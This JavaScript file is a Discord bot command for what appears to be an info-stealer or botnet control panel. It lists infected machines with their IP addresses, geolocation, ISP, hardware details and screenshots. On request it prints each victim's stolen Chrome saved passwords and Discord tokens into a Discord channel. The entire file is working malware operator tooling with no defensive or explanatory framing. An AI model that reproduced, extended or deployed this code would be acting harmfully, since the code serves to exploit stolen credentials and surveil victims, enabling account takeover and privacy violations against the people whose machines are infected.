const fs = require("fs");
const Discord = require("discord.js");
const paginationEmbed = require("discord.js-pagination");
const db = require("../models");
const Op = db.Sequelize.Op;

exports.run = (client, message, args) => {
    if (args.length == 0) {
        db.Bots.findAll().then((results) => {
            if (results.length > 0) {
                const clientsPerPage = 3;
                let pages = [];
                let fields = [];

                for (const [index, element] of results.reverse().entries()) {
                    fields.push({
                        name: !element.tag ? "No tag" : element.tag,
                        value: `
                            **ID**: ${element.id}
                            **IP Address**: ${element.ipAddress}
                            **Country**: ${element.country}
                            **OS**: ${element.operatingSystem}
                            **Release**: ${element.release}
                        `,
                        inline: true,
                    });

                    if (
                        index % clientsPerPage == 2 ||
                        index == results.length - 1
                    ) {
                        const embed = new Discord.MessageEmbed()
                            .setColor("#0099ff")
                            .addFields(fields)
                            .setTimestamp();

                        pages.push(embed);
                        fields = [];
                    }
                }

                paginationEmbed(message, pages);
            } else {
                message.channel.send("No clients connected");
            }
        });
    } else if (args.length == 1) {
        db.Bots.findAll({
            where: {
                [Op.or]: [
                    {
                        id: args[0],
                    },
                    {
                        tag: args[0],
                    },
                ],
            },
        }).then(async (results) => {
            if (results.length > 0) {
                const element = results[0];
                const chromeData = await db.Chrome.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const discordData = await db.Discord.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });
                const screenshotData = await db.Screenshots.findAll({
                    where: {
                        identifier: element.identifier,
                    },
                });

                const chromeLength = chromeData.length;
                const tokensLength =
                    discordData.length > 0
                        ? discordData[0].tokens.split(/\r\n|\r|\n/).length - 1
                        : 0;
                let screenShotPath = "";

                if (screenshotData.length > 0) {
                    screenShotPath = screenshotData[0].link;
                }

                const embed = new Discord.MessageEmbed()
                    .setColor("#0099ff")
                    .addFields({
                        name: !element.tag ? "No tag found" : element.tag,
                        value: `
                            **ID**: ${element.id}
                            **IP Address**: ${element.ipAddress}
                            **Country**: ${element.country}
                            **Region**: ${element.region}
                            **City**: ${element.city}
                            **Location**: https://www.google.com/maps/search/?api=1&query=${
                                element.lat
                            },${element.lon}
                            **ISP**: ${element.isp}
                            **OS**: ${element.operatingSystem}
                            **Release**: ${element.release}
                            **Version**: ${element.version}
                            **Computer Name**: ${element.nodeName}
                            **Processor**: ${element.processor}
                            **Architecture**: ${element.architecture}
                            **Boot Time**: ${element.bootTime}
                            **Cores**: ${
                                !element.cpuCores ? "Unknown" : element.cpuCores
                            }
                            **Memory**: ${element.memory}
                            **Available Info**: \`Chrome ${chromeLength}\` \`Discord ${tokensLength}\``,
                    })
                    .setThumbnail(
                        `https://www.countryflags.io/${element.countryCode}/flat/64.png`
                    )
                    .setTimestamp();

                if (fs.existsSync(screenShotPath)) {
                    const attachment = new Discord.MessageAttachment(
                        screenShotPath,
                        "screenshot.jpg"
                    );

                    embed
                        .attachFiles(attachment)
                        .setImage("attachment://screenshot.jpg");
                }

                message.channel.send(embed);
            } else {
                message.channel.send("Client not found");
            }
        });
    } else if (args.length == 2) {
        if (args[1] == "chrome") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Chrome.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            let output = "";
                            results.forEach((element, i) => {
                                if (i == results.length - 1) {
                                    output =
                                        output +
                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n`;
                                } else {
                                    output =
                                        output +
                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n====================================\n`;
                                }
                            });
                            message.channel.send("```" + output + "```");
                        } else {
                            message.channel.send("No Chrome data found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else if (args[1] == "discord") {
            db.Bots.findAll({
                where: {
                    [Op.or]: [
                        {
                            id: args[0],
                        },
                        {
                            tag: args[0],
                        },
                    ],
                },
            }).then(async (result) => {
                if (result.length > 0) {
                    db.Discord.findAll({
                        where: {
                            identifier: result[0].identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            message.channel.send(
                                "```" + results[0].tokens + "```"
                            );
                        } else {
                            message.channel.send("No Discord tokens found");
                        }
                    });
                } else {
                    message.channel.send("Client not found");
                }
            });
        } else {
            message.channel.send("Invalid argument");
        }
    }
};
